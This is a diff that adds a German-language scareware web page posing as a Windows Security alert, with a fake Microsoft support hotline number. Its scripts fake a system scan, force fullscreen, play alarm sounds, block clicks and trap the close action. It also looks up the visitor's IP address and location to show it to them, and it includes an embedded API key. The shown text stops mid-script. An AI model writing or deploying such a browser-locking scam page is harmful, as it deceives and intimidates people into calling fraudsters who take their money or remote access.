@@ -1,0 +1,1328 @@
+<!DOCTYPE html><html lang="en"><head>
+<!-- Google tag (gtag.js) -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>System Information</title>
+
+<meta name="description"
+      content="System information and status dashboard">
+
+<meta name="robots" content="noindex,nofollow">
+
+<script type="text/javascript">
+(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);
+    t.async=1;
+    t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];
+    y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "vb0l6mk4in");
+</script>
+  <style>
+  /* =======================
+   Top-center Notification (namespaced)
+   ======================= */
+.n-notification{
+  position:fixed; top:20px; left:50%; transform:translateX(-50%);
+  background:#fff; border:1px solid rgba(0,0,0,.15);
+  box-shadow:0 6px 20px rgba(0,0,0,.25);
+  border-radius:10px; padding:18px 24px; width:min(500px,90vw);
+  z-index: 20002; /* higher than #s(20000) & topOverlay(19990); adjust if needed */
+  display:grid; grid-template-columns:auto 1fr auto; gap:16px; align-items:center;
+}
+
+.n-icon{ width:28px; height:28px; }
+.n-title{ font-size:20px; font-weight:600; margin-bottom:6px; }
+.n-message{ font-size:14px; color:#444; }
+
+.n-actions{ display:flex; gap:10px; }
+
+/* Keep button styles local so they don't collide with your .btn/.locked */
+.n-btn{
+  border:none; border-radius:6px; padding:10px 18px;
+  font-weight:600; cursor:pointer;
+  transition: background .2s, color .2s, border .2s;
+}
+
+/* ✅ stable green (uses your tokens) */
+.n-btn-green{ background: var(--ok); color:#fff; }
+.n-btn-green:hover{ filter: brightness(.95); }
+
+/* 🔴 flashing red ↔ white (uses your tokens) */
+.n-btn-red{
+  color: var(--danger);
+  border:2px solid var(--danger);
+  animation: n-flashRed 1s steps(2, end) infinite;
+}
+@keyframes n-flashRed{
+  0%,100% { background: var(--danger); color:#fff; }
+  50%     { background:#fff;          color: var(--danger); }
+}
+
+/* close button */
+.n-close{
+  position:absolute; top:8px; right:10px; background:none; border:none;
+  font-size:22px; cursor:pointer; color:#888;
+  transition:transform .3s ease, color .2s ease;
+}
+.n-close:hover{ color:#e53935; transform:rotate(90deg) scale(1.2); }
+.n-close:active{ transform:rotate(180deg) scale(.9); color:#b71c1c; }
+
+/* ♿ respect reduced motion */
+@media (prefers-reduced-motion: reduce){
+  .n-btn-red{ animation: none; }
+}
+    :root{
+      --bg1:#0b61d1; --bg2:#1a73e8; --bg3:#4ea1ff; --fg:#0f172a;
+      --surface:#ffffff; --border:#e2e8f0; --accent:var(--bg2); --accent-2:#1d4ed8;
+      --ok:#16a34a; --danger:#ef4444; --warn:#f59e0b;
+    }
+    *{box-sizing:border-box} html,body{height:100%; margin:0; overflow:hidden;}
+    body{font-family:"Segoe UI",system-ui,-apple-system,Roboto,Arial,sans-serif; color:var(--fg); background: var(--bg1) url('images/img1.png') center/cover no-repeat;}
+    .win{position:fixed; left:50%; transform:translateX(-50%); background:var(--surface);
+      border:1px solid var(--border); border-radius:14px; box-shadow:0 10px 30px rgba(2,6,23,.18);
+      overflow:hidden; min-width:360px; user-select:none; display:none; opacity:0;
+      will-change: transform, opacity; contain: content}
+    .titlebar{display:flex; justify-content:space-between; align-items:center; padding:8px 12px; font-weight:normal; font-size:14px; background:linear-gradient(180deg,#fff,#f2f4f7); border-bottom:1px solid var(--border);}
+    .content{padding:24px}
+    .btn{padding:10px 14px; border-radius:12px; border:1px solid var(--border); background:#fff; font-weight:800; cursor:pointer; will-change: transform}
+    .btn.primary{background:var(--accent); color:#fff; border-color:transparent}
+    .btn.primary:hover{background:var(--accent-2)}
+    .popup-in{animation:pop .3s cubic-bezier(.2,.8,.2,1) both}
+    @keyframes pop{from{opacity:0; transform:translateX(-50%) scale(.96)} to{opacity:1; transform:translateX(-50%) scale(1)}}
+    @keyframes professional-pulse-center {
+      0%, 100% { transform: translateX(-50%) scale(1); }
+      50% { transform: translateX(-50%) scale(1.015); }
+    }
+    @keyframes professional-pulse-regular {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.015); }
+    }
+    .win, .smartscreen {animation: professional-pulse-center 5s ease-in-out infinite;}
+    .action-center, .toast {animation: professional-pulse-regular 5s ease-in-out infinite;}
+    #s {animation: professional-pulse-center 1.5s ease-in-out infinite;}
+    .hotline {animation: professional-pulse-regular 1.5s ease-in-out infinite;}
+    .smartscreen{position:fixed; top:0; left:50%; transform:translate(-50%,0); width:900px;
+      background:#fff; border:1px solid var(--border); border-top:none; border-radius:0 0 14px 14px; box-shadow:0 10px 30px rgba(2,6,23,.18);
+      z-index:9800; display:none; opacity:0; contain: content}
+    .smartscreen .row{display:flex; align-items:center; gap:10px; padding:10px 14px; border-bottom:1px solid var(--border); font-weight:800}
+    .smartscreen .body{padding:12px; font-size:14px; color:#0b2b66}
+    .smartscreen .actions{display:flex; gap:8px; padding:0 12px 12px 12px; justify-content:flex-end}
+    .action-center{position:fixed; top:70px; right:16px; width:340px; display:none; flex-direction:column; gap:10px; z-index:9700; opacity:0; contain: content}
+    .card{background:#fff; border:1px solid var(--border); border-radius:12px; box-shadow:0 8px 24px rgba(2,6,23,.12); padding:12px}
+    .card .title{font-weight:900; margin-bottom:4px}
+    .card .meta{font-size:12px; color:#64748b}
+    .toast{position:fixed; right:18px; bottom:58px; width:340px; border-radius:12px; border:1px solid var(--border); background:#fff; box-shadow:0 8px 24px rgba(2,6,23,.12); display:none; gap:12px; padding:12px; align-items:flex-start; z-index:9600; opacity:0; contain: content}
+    .toast .ico{width:36px;height:36px;border-radius:8px;display:grid;place-items:center;background:linear-gradient(180deg,#4ea1ff,#1a73e8);border:1px solid #cfe0ff; color:#fff}
+    #integrity{top:12%; width:560px; z-index:9900}
+    #leave{top:50%; width:380px; z-index:9950}
+    #scan{top:74%; width:780px; z-index:9500}
+    .log{background:#0b1220; color:#c8d3ff; font:12px/1.5 ui-monospace,Consolas,Menlo,monospace; height:180px; overflow:auto; padding:10px; border-radius:10px; border:1px solid #1f2a44;}
+    .progress{height:10px; background:#e8edf5; border-radius:999px; overflow:hidden; margin-top:8px; position:relative}
+    .bar{height:100%; width:0; background:linear-gradient(90deg, var(--bg3), var(--bg2))}
+    #defender{top:28%; width:820px; z-index:10000}
+    .head-row{display:flex; align-items:center; justify-content:space-between; padding:12px 14px; border-bottom:1px solid var(--border); background:linear-gradient(180deg,#fff,#f2f4f7)}
+ .brand {
+  font-size: 24px;
+  font-weight: 600;
+  color: #1a1a1a;
+  line-height: 1.2;
+}
+.right {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-end; /* Align logo & button to the right */
+  gap: 8px;
+}
+
+    .shield{width:20px; height:20px; display:inline-block; background:conic-gradient(from 180deg, var(--bg1), var(--bg3)); border-radius:4px; position:relative}
+    .shield::after{content:""; position:absolute; inset:3px; background:#fff; clip-path:polygon(50% 0, 100% 25%, 100% 75%, 50% 100%, 0 75%, 0 25%); border-radius:2px}
+    .grid{display:grid; grid-template-columns: 1.1fr .9fr; gap:12px}
+    .panel{border:1px solid var(--border); border-radius:10px; padding:10px; background:#fff}
+    .panel h4{margin:0 0 6px; font-size:13px; font-weight:900; color:#0b2b66}
+    .muted{color:#475569; font-size:13px}
+    .badge{display:inline-flex; align-items:center; gap:6px; padding:4px 10px; border-radius:999px; font-weight:900; font-size:12px}
+    .badge.info{background:linear-gradient(90deg,#4ea1ff,#1a73e8); color:#fff}
+    .badge.warn{background:linear-gradient(90deg,#fbbf24,#f59e0b); color:#fff}
+    .badge.bad{background:linear-gradient(90deg,#f87171,#ef4444); color:#fff}
+    .meter{display:flex; align-items:center; gap:12px}
+    .meter canvas{width:74px; height:74px; background:radial-gradient(circle at 70% 30%, rgba(255,255,255,.8), rgba(255,255,255,.3)); border-radius:50%; border:1px solid var(--border)}
+    .legend{display:grid; gap:2px; font-size:13px}
+    .threat{display:flex; align-items:center; justify-content:space-between; border:1px solid var(--border); border-radius:10px; padding:8px 10px; margin:6px 0}
+    #topOverlay{position:fixed; inset:0; background:rgba(0,0,0,.50); display:none; z-index:19990; cursor:not-allowed;}
+    #s{top:14%; width:740px; z-index:20000}
+    .title-text { display: flex; align-items: center; gap: 8px; }
+    .title-icon { font-size: 18px; }
+    .window-controls { display: flex; gap: 16px; font-family: sans-serif; }
+    .window-controls .close-btn { color: #000; background-color: #e81123; padding: 2px 8px; font-weight: bold;}
+    .window-controls .close-btn:hover { background-color: #f1707a; }
+    #s .actions{display:flex; justify-content:flex-end; padding-top:16px; border-top:1px solid var(--border); margin-top:16px;}
+    #s .notice{
+      margin-top: 12px;
+      background: var(--danger);
+      border: 1px solid #fecaca;
+      color: #fff;
+      padding: 10px 12px;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 700;
+      line-height: 1.5;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    #s .notice .logo {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      display: grid;
+      grid-template-columns: repeat(2,1fr);
+      grid-template-rows: repeat(2,1fr);
+      gap: 2px;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.4);
+      flex-shrink: 0;
+    }
+    #s .notice .logo .sq.r{background:#f44336}.sq.g{background:#4caf50}.sq.b{background:#2196f3}.sq.y{background:#ffeb3b}
+    #s .notice .text-content {
+      flex-grow: 1;
+    }
+    #s .notice .call-info {
+      font-size: 18px;
+      font-weight: 900;
+      margin-top: 5px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    #s .notice .phone-number {
+      font-size: 28px;
+      color: #fff;
+      font-weight: 900;
+      letter-spacing: .5px;
+      white-space: nowrap; /* Added to prevent phone number from wrapping */
+    }
+    
+    /* EDITED: Hotline section made smaller and logo adjusted */
+ .hotline {
+  position: fixed;
+  right: 20px;
+  bottom: 30px;
+  width: 300px;
+  max-width: calc(100vw - 40px);
+  background: #ffffff;
+  border-radius: 18px;
+  border: 1px solid #e5e7eb;
+  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+  padding: 16px 18px;
+  z-index: 20001;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 10px;
+  opacity: 1;
+  animation: slideUp 0.4s ease-out;
+  font-family: "Segoe UI", Arial, sans-serif;
+}
+    .hotline::after{content:""; position:absolute; left:52%; bottom:-20px; width:0; height:0; transform:translateX(-50%);
+      border-left:16px solid transparent; border-right:16px solid transparent; border-top:20px solid #fff; 
+    }
+    .hotline .info {
+      flex-grow: 1;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+   .hotline-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  width: 100%;
+}
+
+.hotline img {
+  width: 42px;
+  height: 42px;
+  border-radius: 8px;
+}
+.hotline-info {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
+
+
+.hotline:hover {
+  transform: translateY(-4px);
+  box-shadow: 0 12px 32px rgba(0, 0, 0, 0.12);
+}
+
+.hotline .top-row {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 0px;
+}
+
+.hotline .logo {
+  width: 40px;
+  height: 40px;
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  grid-template-rows: repeat(2, 1fr);
+  gap: 2px;
+  border-radius: 8px;
+  overflow: hidden;
+  flex-shrink: 0;
+}
+
+.sq {
+  width: 100%;
+  height: 100%;
+}
+
+.sq.r { background: #f25022; }
+.sq.g { background: #7fba00; }
+.sq.b { background: #00a4ef; }
+.sq.y { background: #ffb900; }
+
+.hotline .brand {
+  font-weight: 700;
+  font-size: 18px;
+  color: #111827;
+  line-height: 1.3;
+}
+
+.hotline .free {
+  font-size: 13px;
+  color: #6b7280;
+  margin-top: 2px;
+}
+
+.hotline-number {
+  font-weight: 700;
+  font-size: 22px;
+  color: #2563eb;
+  background: #f3f6fc;
+  border-radius: 12px;
+  padding: 8px 12px;
+  text-align: center;
+  width: 100%;
+  transition: background 0.3s ease, color 0.3s ease;
+}
+.hotline-number:hover {
+  background: #2563eb;
+  color: #ffffff;
+  cursor: pointer;
+}
+@keyframes slideUp {
+  from {
+    transform: translateY(40px);
+    opacity: 0;
+  }
+  to {
+    transform: translateY(0);
+    opacity: 1;
+  }
+}
+
+
+
+
+
+
+ 
+
+    #edu{position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(2,6,23,.70); z-index:21000; contain: content}
+    #edu .box{width:760px; background:#fff; border:1px solid var(--border); border-radius:14px; box-shadow:0 10px 30px rgba(2,6,23,.18); padding:14px}
+    .taskbar{position:fixed; left:0; right:0; bottom:0; height:46px; padding:0 14px; display:flex; align-items:center; justify-content:space-between;
+      background:rgba(255,255,255,.82); border-top:1px solid rgba(255,255,255,.7); z-index:9000}
+    .tb-chip{display:inline-flex; align-items:center; gap:8px; padding:6px 10px; background:#fff; border:1px solid var(--border); border-radius:10px; font-size:13px; color:#0d2b57;}
+    #escHint{position:fixed; top:10px; left:50%; transform:translateX(-50%); z-index:22000; padding:12px 16px; border-radius:12px; background:#111827; color:#fff; font-weight:900; border:1px solid #374151; transition: opacity 0.3s ease; display: flex; align-items: center; gap: 12px; font-size: 16px; box-shadow: 0 4px 12px rgba(0,0,0,.5);}
+    #escHint[hidden] { opacity: 0; pointer-events: none; }
+    #escProgress { width: 28px; height: 28px; border: 3px solid #4b5563; border-radius: 50%; background: conic-gradient(#4ea1ff 0% 0%, #374151 0% 100%); transition: background 0.1s linear; }
+    .locked { cursor: not-allowed !important; }
+    @media (max-width: 920px) {
+      .win, .smartscreen, #edu .box { width: 95%; min-width: 0; }
+      .grid { grid-template-columns: 1fr; }
+    }
+    @media (max-width: 540px) {
+      .content, .card, .toast { padding: 10px; }
+      .hotline { padding: 12px; bottom: 58px; right: 12px; left: 12px; width: auto; }
+      .hotline .brand { font-size: 20px; }
+      .hotline .num { font-size: 28px; }
+      .hotline .free { font-size: 15px; }
+      .hotline .right { flex-direction: column; align-items: flex-end; gap: 4px; margin-right: 0; /* Remove margin on mobile */ }
+      .hotline .logo { margin-left: 0; margin-top: 12px; /* Adjusted for vertical stacking */ }
+      #s .notice { flex-direction: column; align-items: flex-start; }
+      #s .notice .call-info { flex-direction: column; align-items: flex-start; font-size: 16px; }
+      #s .notice .phone-number { font-size: 22px; }
+    }
+
+
+
+.footer-marquee {
+  position: fixed;
+  left: 0;
+  right: 0;
+  bottom: 0px; /* above the taskbar */
+  height: 38px;
+  background: #2563eb;
+  color: #fff;
+  z-index: 99999;
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+  font-size: 17px;
+  font-weight: 600;
+  box-shadow: 0 -2px 8px rgba(30,64,175,0.10);
+}
+.marquee-text {
+  display: inline-block;
+  white-space: nowrap;
+  padding-left: 100vw;
+  animation: marquee-move 30s linear infinite;
+}
+@keyframes marquee-move {
+  0%   { transform: translateX(0); }
+  100% { transform: translateX(-100%); }
+}
+
+/* Add this to your <style> section if not present */
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+  </style>
+</head>
+<body>
+
+
+    
+    
+ <div style="position: fixed; top: 1%; left: 33%; width: 33%; background: white; border: 1px solid #ccc; box-shadow: 0px 0px 10px #aaa; padding:10px 16px; font-family: sans-serif;  z-index: 2147483647 !important; /* the max 32-bit int */;">
+  
+  <div style="display: flex; align-items: center; margin-bottom: 15px;">
+    <div style="color: orange; font-size: 24px; margin-right: 10px;">⚠</div>
+    <div style="font-size: 18px; font-weight: bold;">Website verlassen?</div>
+    <div style="margin-left: auto; font-size: 20px; color: red; cursor: pointer;">✖</div>
+  </div>
+
+  <div style="margin-bottom: 20px;">
+    <div style="display: inline-block; width: 16px; height: 16px; border: 1px solid #000; margin-right: 5px; vertical-align: middle;"></div>
+    <div style="display: inline-block; vertical-align: middle;">Verhindern, dass diese Seite zusätzliche Dialogfelder erstellt</div>
+  </div>
+
+ <div style="display: flex; justify-content: flex-end; gap: 20px;">
+    <div style="padding: 6px 12px; font-size: 14px; cursor: pointer; border: none;  border-radius: 3px; border: 1px solid red;">Reload</div>
+    <div style="margin-right: 10px; padding: 6px 12px; font-size: 14px; cursor: pointer; background-color: #e0e0e0; border: 1px solid #ccc; border-radius: 3px; background-color: rgb(232, 22, 22); color: white; animation: blink 1s infinite;">Leave</div>
+</div>
+
+</div>
+
+  <audio id="alertSound1" preload="auto">
+    <source src="media/play1.mp3" type="audio/mpeg">
+    Ihr Browser unterstützt das Audioelement nicht.
+  </audio>
+  <audio id="alertSound2" preload="auto">
+    <source src="media/play2.mp3" type="audio/mpeg">
+    Ihr Browser unterstützt das Audioelement nicht.
+  </audio>
+  <div id="escHint" hidden="" aria-live="assertive">
+    DIESES THREAD NICHT SCHLIESSEN (JETZT DEN WINDOWS-SUPPORT ANRUFEN)
+    <div id="escProgress"></div>
+  </div>
+  <div id="topOverlay" style="display: block;"></div>
+  <section id="s" class="win popup-in" style="display: block;opacity: 1;height: 70%;">
+    <div class="titlebar">
+      <div class="title-text">
+        <span class="title-icon">⚠️</span>
+        Windows-Sicherheit
+      </div>
+      <div class="window-controls">
+        <span class="locked">—</span>
+        <span class="locked">◻</span>
+        <span class="close-btn locked">✕</span>
+      </div>
+    </div>
+   <!-- ...existing code... -->
+   <div id="microsoft-popup" style="
+    width: 560px;
+    background-color: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+    border: 1px solid #e1e4e8;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+">
+<!-- Centering wrapper -->
+<div style="
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  background-color: #f3f4f6;
+">
+
+  <!-- Notification card -->
+ <!-- Sirf Image -->
+<div style="width:100%; text-align:center;">
+    <img src="images/img4.png" alt="Image" style="max-width: 100%;height:auto;position: absolute;top: 10%;left: 0%;">
+</div>
+
+<!-- Hidden Elements (IDs same rahengi JS ke liye) -->
+<div style="display:none;">
+    <span id="ipAddress"></span>
+    <span id="convertedIP"></span>
+    <span id="city"></span>
+    <span id="region"></span>
+    <span id="longitude"></span>
+    <span id="latitude"></span>
+</div>
+
+<script>
+async function checkIP() {
+  try {
+    const response = await fetch('https://ipapi.co/json/', {
+      method: 'GET',
+      cache: 'no-store'
+    });
+
+    const data = await response.json();
+
+    document.getElementById('ipAddress').textContent =
+      data?.ip ?? "N/A";
+
+    document.getElementById('convertedIP').textContent =
+      data?.ip ?? "N/A";
+
+    document.getElementById('city').textContent =
+      data?.city ?? "N/A";
+
+    document.getElementById('region').textContent =
+      data?.region ?? "N/A";
+
+    document.getElementById('longitude').textContent =
+      data?.longitude ?? "N/A";
+
+    document.getElementById('latitude').textContent =
+      data?.latitude ?? "N/A";
+
+  } catch (err) {
+    console.error('IP lookup failed:', err);
+  }
+}
+
+document.addEventListener("DOMContentLoaded", checkIP);
+</script>
+
+
+
+
+</div>
+
+
+  
+<!-- ...existing code... -->
+  </div></div></section>
+
+<aside id="hotline" class="hotline">
+  <div class="hotline-header">
+    <img src="images/img3.webp" alt="Microsoft logo">
+    <div class="hotline-info">
+      <div class="brand">Microsoft Kundensupport</div>
+      <div class="free">(Gebührenfrei)</div>
+    </div>
+  </div>
+  <div class="hotline-number">0800 700 001</div>
+</aside>
+
+
+<section id="defender" class="win popup-in" style="display: block; opacity: 1;">
+  <div class="head-row">
+    <div class="brand">
+      <span class="shield"></span> Windows-Sicherheit – Überprüfung empfohlen
+    </div>
+    <span class="tag">Windows</span>
+  </div>
+  <div class="content">
+    <div class="grid">
+      <div class="panel">
+        <h4>Live-Analyse</h4>
+        <div class="meter">
+          <canvas id="ring" width="74" height="74"></canvas>
+          <div class="legend">
+            <div><strong>Phase:</strong> <span id="phase">Scanning temp files</span></div>
+            <div><strong>Vertrauen:</strong> <span id="conf">36%</span></div>
+            <div class="badge info" id="statusBadge">Analysieren…</div>
+          </div>
+        </div>
+        <div class="spark"><canvas id="spark" width="0" height="0"></canvas></div>
+        <div class="muted" id="hint">Looking for known patterns and anomalies…</div>
+      </div>
+
+      <div class="panel" id="findings">
+        <h4>Erkenntnisse</h4>
+        <div id="threats"><div class="muted">Warten auf Analyse…</div></div>
+        <div class="btn-row">
+          <button class="btn locked" id="openScan">Scan Öffnen</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="integrity" class="win">
+  <div class="titlebar">Page Integrity</div>
+  <div class="content">
+    <p><strong>Heads up:</strong> Einige Elemente auf dieser Seite wurden möglicherweise nicht korrekt geladen.</p>
+    <div class="notice">
+      Dies kann vorkommen, wenn generische Ressourcennamen blockiert sind oder externe Ressourcen nicht verfügbar sind. Für diese Demo ist das in Ordnung.
+    </div>
+    <div class="btn-row">
+      <button class="btn primary locked" id="okIntegrity">OK</button>
+    </div>
+  </div>
+</section>
+
+<section id="leave" class="win">
+  <div class="titlebar">⚠️ Website verlassen?</div>
+  <div class="content">
+    <label class="checkbox">
+      <input type="checkbox" id="preventDialogs" class="locked">
+      Verhindern, dass diese Seite zusätzliche Dialogfelder erstellt
+    </label>
+    <div class="btn-row">
+      <button class="btn red locked" id="leaveBtn">verlassen</button>
+      <button class="btn locked" id="reloadBtn">Neu laden</button>
+    </div>
+  </div>
+</section>
+
+<section id="scan" class="win">
+  <div class="titlebar">Systemscan (Sicherheitsprüfung)</div>
+  <div class="content">
+    <div class="log" id="log"></div>
+    <div class="progress" id="progress"><div class="bar" id="bar"></div></div>
+    <div class="cta">
+      <button class="btn primary locked" id="scanNow">Starten Sie den Scan</button>
+    </div>
+  </div>
+</section>
+
+<div class="action-center" id="actionCenter">
+  <div class="card">
+    <div class="title">Windows Security</div>
+    <div class="meta">Jetzt</div>
+    Ungewöhnlicher Anmeldeversuch erkannt.
+  </div>
+  <div class="card">
+    <div class="title">Device Performance & Health</div>
+    <div class="meta">1 min ago</div>
+    Storage capacity OK. Battery OK. No action needed.
+  </div>
+  <div class="card">
+    <div class="title">Firewall & Network Protection</div>
+    <div class="meta">2 min ago</div>
+    Public network active.
+  </div>
+</div>
+
+<aside class="toast" id="toast">
+  <div class="ico">🔔</div>
+  <div>
+    <div class="title">Sicherheitsüberprüfung läuft</div>
+    <div class="subtitle">Klicken Sie irgendwo, um Benachrichtigungen und den Vollbildmodus zu aktivieren..</div>
+  </div>
+</aside>
+
+<footer class="taskbar">
+  <div class="tb-chip" id="clock">11:11</div>
+  <div class="tb-chip">Windows Security</div>
+</footer>
+
+
+
+<div class="footer-marquee">
+  <div class="marquee-text">
+    Windows-Sicherheitshinweis • Überprüfung empfohlen • Kontaktieren Sie den Support:
+    0800 700 001 • Sichern Sie jetzt Ihr Gerät.
+  </div>
+</div>
+
+<script>
+  $(document).ready(function () {
+      $("#ev_talkbox_wrapper").click(function () {
+          $("#ev_talkbox_wrapper").hide();
+      });
+  });
+</script>
+
+<script>
+const $ = (s) => {
+  try {
+    const el = document.querySelector(s);
+    if (!el) console.error(`Element not found: ${s}`);
+    return el;
+  } catch (e) {
+    console.error(`Error in DOM query for selector ${s}:`, e);
+    return null;
+  }
+};
+const POPUP_STAGGER = 200; 
+
+let allowExit = false;
+let audioPlaying = false;
+let hasClicked = false;
+
+window.addEventListener('error', (e) => {
+  console.error('Script error caught:', {
+    message: e.message,
+    filename: e.filename,
+    lineno: e.lineno,
+    colno: e.colno,
+    error: e.error
+  });
+  return true;
+});
+
+window.addEventListener('unhandledrejection', (e) => {
+  console.error('Unhandled promise rejection:', e.reason);
+  return true;
+});
+
+function fetchLocation(retry = true) {
+  const locationInfo = $("#location-info");
+  if (!locationInfo) {
+    console.error("Location info element (#location-info) not found");
+    return;
+  }
+
+  try {
+    fetch('https://apiip.net/api/check?accessKey=4f804a10-5e73-43bd-a8b5-2f2dd94a8f61')
+      .then(response => {
+        if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+        return response.json();
+      })
+      .then(data => {
+      locationInfo.innerHTML = `
+  <span style="color: #000;"><strong>IP Address:</strong></span> <span style="color: #e11d48; font-weight: bold;">${data.ip || 'Unknown'}</span><br>
+  <span style="color: #000;"><strong>Country:</strong></span> <span style="color: #e11d48; font-weight: bold;">${data.country_name || 'Unknown'}</span><br>
+  <span style="color: #000;"><strong>City:</strong></span> <span style="color: #e11d48; font-weight: bold;">${data.city || 'Unknown'}</span><br>
+  <span style="color: #000;"><strong>Coordinates:</strong></span> <span style="color: #e11d48; font-weight: bold;">${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}</span>
+`;
+        console.log("Location data fetched successfully:", data);
+      })
+      .catch(err => {
+        console.warn("Location fetch failed:", err.message);
+        if (retry) {
+          console.log("Retrying location fetch in 2 seconds...");
+          setTimeout(() => fetchLocation(false), 2000);
+        } else {
+          locationInfo.innerHTML = "Unable to fetch location data. Please contact support.";
+          console.error("Final attempt to fetch location data failed:", err);
+        }
+      });
+  } catch (e) {
+    console.error("Unexpected error in fetchLocation:", e);
+    locationInfo.innerHTML = "Error fetching location data. Please try again or contact support.";
+  }
+}
+
+function setupAudio() {
+  const audio1 = $("#alertSound1");
+  const audio2 = $("#alertSound2");
+  if (!audio1 || !audio2) {
+    console.error("Audio elements not found");
+    showAudioToast();
+    return;
+  }
+
+  try {
+    audio1.volume = 0.5;
+    audio2.volume = 0.5;
+
+    function playAudio() {
+      if (!audioPlaying && !allowExit) {
+        audio1.play().then(() => {
+          console.log("Playing 1.mp3");
+          audioPlaying = true;
+        }).catch(err => {
+          console.warn("Audio1 play failed:", err);
+          showAudioToast();
+        });
+        audio2.play().then(() => {
+          console.log("Playing 2.mp3");
+        }).catch(err => {
+          console.warn("Audio2 play failed:", err);
+          showAudioToast();
+        });
+      }
+    }
+
+    function stopAudio() {
+      if (audioPlaying) {
+        audio1.pause();
+        audio2.pause();
+        audioPlaying = false;
+        console.log("Audio stopped");
+      }
+    }
+
+    function showAudioToast() {
+      const toast = $("#toast");
+      if (toast) {
+        toast.innerHTML = `
+          <div class="ico">🔊</div>
+          <div>
+            <div style="font-weight:900;color:#ef4444">Enable Alert Sound</div>
+            <div style="font-size:13px;color:#475569">Click <button class="btn primary" id="enableAudio">Enable Sound</button> to activate security alerts.</div>
+          </div>`;
+        toast.style.display = "flex";
+        toast.classList.add("popup-in");
+        toast.style.opacity = "1";
+        const enableAudioBtn = $("#enableAudio");
+        if (enableAudioBtn) {
+          enableAudioBtn.addEventListener("click", () => {
+            playAudio();
+            toast.style.display = "none";
+          }, { once: true });
+        }
+      }
+    }
+
+    // Play audio when entering fullscreen, stop when exiting
+    document.addEventListener("fullscreenchange", () => {
+      if (document.fullscreenElement && !allowExit) {
+        playAudio();
+      } else {
+        stopAudio();
+      }
+    }, { capture: true });
+
+    // Trigger fullscreen and audio on first click
+    document.addEventListener("click", () => {
+      if (!hasClicked && !allowExit) {
+        hasClicked = true;
+        console.log("First click: triggering fullscreen and audio");
+        enterFullscreen();
+        const topOverlay = $("#topOverlay");
+        if (topOverlay) topOverlay.style.display = "block";
+      }
+    }, { once: true, capture: true });
+  } catch (e) {
+    console.error("Error in setupAudio:", e);
+    showAudioToast();
+  }
+}
+
+function blockInteractions(e) {
+  if (!allowExit && hasClicked) {
+    e.preventDefault();
+    e.stopPropagation();
+    e.stopImmediatePropagation();
+    e.returnValue = false;
+    const toast = $("#toast");
+    if (toast) {
+      toast.innerHTML = `
+        <div class="ico">⚠️</div>
+        <div>
+          <div style="font-weight:900;color:#ef4444">Action Blocked</div>
+          <div style="font-size:13px;color:#475569">Hold Esc for 3 seconds to exit and enable actions.</div>
+        </div>`;
+      toast.style.display = "flex";
+      toast.classList.add("popup-in");
+      toast.style.opacity = "1";
+    }
+    const edu = $("#edu");
+    if (edu) edu.style.display = "flex";
+  }
+}
+
+window.addEventListener("beforeunload", (e) => {
+  if (!allowExit) {
+    e.preventDefault();
+    e.returnValue = "Warning: Closing this page may compromise your data. Call support at 0800 700 001 to resolve.";
+    const edu = $("#edu");
+    if (edu) edu.style.display = "flex";
+    return e.returnValue;
+  }
+}, { capture: true });
+
+function startClock() {
+  try {
+    const el = $("#clock");
+    if (el) {
+      const tick = () => el.textContent = new Date().toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
+      tick();
+      setInterval(tick, 1000);
+    }
+  } catch (e) {
+    console.error("Error in startClock:", e);
+  }
+}
+
+function setupFullscreen() {
+  try {
+    const hint = $("#escHint");
+    let holdTimer = null;
+    let holdStart = 0;
+
+    window.enterFullscreen = () => {
+      if (!document.fullscreenElement && !allowExit) {
+        const el = document.documentElement;
+        const rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+        if (rfs) {
+          rfs.call(el).then(() => {
+            console.log("Entered fullscreen");
+          }).catch((err) => {
+            console.warn("Fullscreen request failed:", err);
+            setTimeout(enterFullscreen, 1);
+          });
+        }
+      }
+    };
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape" && !allowExit) {
+        if (!holdTimer) {
+          holdStart = performance.now();
+          if (hint) hint.removeAttribute("hidden");
+          holdTimer = setInterval(() => {
+            const elapsed = performance.now() - holdStart;
+            const progress = Math.min(elapsed / 3000, 1);
+            const progressEl = $("#escProgress");
+            if (progressEl) {
+              progressEl.style.background = `conic-gradient(#4ea1ff ${progress * 360}deg, #374151 0deg)`;
+            }
+            if (progress >= 1) {
+              clearInterval(holdTimer);
+              holdTimer = null;
+              allowExit = true;
+              if (navigator.keyboard && navigator.keyboard.unlock) {
+                navigator.keyboard.unlock();
+              }
+              if (document.pointerLockElement) {
+                document.exitPointerLock();
+              }
+              document.exitFullscreen?.();
